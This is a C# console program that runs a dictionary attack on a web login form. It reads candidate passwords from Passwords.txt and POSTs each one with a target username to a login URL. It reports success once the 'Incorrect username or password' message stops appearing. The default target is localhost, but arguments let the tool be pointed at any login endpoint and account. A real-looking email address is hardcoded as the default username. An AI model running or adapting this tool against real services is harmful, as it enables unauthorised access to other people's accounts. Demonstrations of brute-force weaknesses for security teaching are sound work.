using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web;

namespace PasswordDictionaryAttack
{
    class Program
    {
        static void Main(string[] args)
        {
            var logonPath = "http://localhost:44375/Account/Login";
            var username = "rm@gss.com.tw";

            if (args.Length == 1)
            {
                username = args[0];
            }

            if (args.Length == 2)
            {
                logonPath = args[0];
                username = args[1];
            }

            Console.WriteLine();
            Console.WriteLine("Testing username {0} at logon path: {1}", username, logonPath);
            Console.WriteLine("Please press any key to start .....");
            Console.ReadKey();

            using (var sr = new StreamReader("Passwords.txt"))
            {
                String password;
                while ((password = sr.ReadLine()) != null)
                {
                    Console.WriteLine("Testing password: {0}", password);
                    Thread.Sleep(10);

                    var postData = string.Format("Email={0}&Password={1}", HttpUtility.UrlEncode(username), HttpUtility.UrlEncode(password));

                    var req = (HttpWebRequest)WebRequest.Create(logonPath);
                    req.Method = "POST";

                    var byteArray = Encoding.UTF8.GetBytes(postData);
                    req.ContentType = "application/x-www-form-urlencoded";
                    req.ContentLength = byteArray.Length;
                    var dataStream = req.GetRequestStream();
                    dataStream.Write(byteArray, 0, byteArray.Length);
                    dataStream.Close();

                    string respBody;
                    try
                    {
                        using (var resp = (HttpWebResponse)req.GetResponse())
                        {
                            respBody = GetResponseBody(resp);
                        }
                    }
                    catch (WebException e)
                    {
                        respBody = GetResponseBody((HttpWebResponse)e.Response);
                    }

                    if (respBody.Contains("Incorrect username or password"))
                    {
                        Console.WriteLine("Incorrect password");
                        Console.WriteLine();
                    }
                    else
                    {
                        Console.WriteLine($"********{username} Password found! *********");
                        Console.ReadLine();
                        return;
                    }
                }

                Console.WriteLine($"********{username} Could not find a password");
            }
        }

        private static string GetResponseBody(HttpWebResponse resp)
        {
            using (var respStream = new StreamReader(resp.GetResponseStream()))
            {
                return respStream.ReadToEnd();
            }
        }
    }
}
